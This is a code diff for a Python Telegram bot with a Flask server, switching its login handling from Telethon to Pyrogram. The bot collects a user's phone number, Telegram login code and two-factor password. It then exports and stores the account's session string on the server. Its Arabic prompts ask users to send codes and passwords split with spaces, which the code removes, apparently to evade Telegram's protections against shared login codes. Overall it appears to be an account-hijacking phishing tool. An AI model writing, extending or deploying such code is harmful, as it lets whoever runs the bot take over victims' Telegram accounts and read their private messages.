@@ -5,9 +5,8 @@ import nest_asyncio
 from flask import Flask, request, jsonify, send_file
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, ConversationHandler
-from telethon import TelegramClient
-from telethon.sessions import StringSession
-from telethon.errors import SessionPasswordNeededError
+from pyrogram import Client as PyroClient
+from pyrogram.errors import SessionPasswordNeeded
 import logging
 
 nest_asyncio.apply()
@@ -23,6 +22,7 @@ BASE_URL = os.environ.get("BASE_URL", "")
 app = Flask(__name__)
 sessions = {}
 user_tokens = {}
+pyro_clients = {}
 application = None
 
 PHONE, CODE, PASSWORD = range(3)
@@ -37,11 +37,17 @@ async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
     phone = update.message.text.strip()
     context.user_data["phone"] = phone
     try:
-        loop = asyncio.get_event_loop()
-        client = TelegramClient(StringSession(), API_ID, API_HASH, loop=loop)
+        client = PyroClient(
+            name=f"session_{phone}",
+            api_id=API_ID,
+            api_hash=API_HASH,
+            phone_number=phone,
+            in_memory=True
+        )
         await client.connect()
-        await client.send_code_request(phone)
+        sent = await client.send_code(phone)
         context.user_data["client"] = client
+        context.user_data["phone_code_hash"] = sent.phone_code_hash
         await update.message.reply_text("✅ وصلك رمز على تلغرام، أرسله هنا:")
         return CODE
     except Exception as e:
@@ -49,13 +55,14 @@ async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return ConversationHandler.END
 
 async def get_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    code = update.message.text.strip()
+    code = update.message.text.strip().replace(" ", "")
     phone = context.user_data["phone"]
     client = context.user_data["client"]
+    phone_code_hash = context.user_data["phone_code_hash"]
     try:
-        await client.sign_in(phone, code)
+        await client.sign_in(phone, phone_code_hash, code)
         return await finish_login(update, context, client)
-    except SessionPasswordNeededError:
+    except SessionPasswordNeeded:
         await update.message.reply_text(
             "🔐 حسابك عنده مصادقة ثنائية!\n\n"
             "أرسل كلمة المرور بشكل مفرق\n"
@@ -71,17 +78,15 @@ async def get_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
     password = raw.replace(" ", "")
     client = context.user_data["client"]
     try:
-        await client.sign_in(password=password)
+        await client.check_password(password)
         return await finish_login(update, context, client)
     except Exception:
-        await update.message.reply_text(
-            "❌ كلمة المرور خاطئة\nحاول مرة ثانية:"
-        )
+        await update.message.reply_text("❌ كلمة المرور خاطئة\nحاول مرة ثانية:")
         return PASSWORD
 
 async def finish_login(update: Update, context: ContextTypes.DEFAULT_TYPE, client):
     phone = context.user_data["phone"]
-    session_str = client.session.save()
+    session_str = await client.export_session_string()
     sessions[phone] = session_str
     user_id = update.effective_user.id
     token = secrets.token_hex(16)
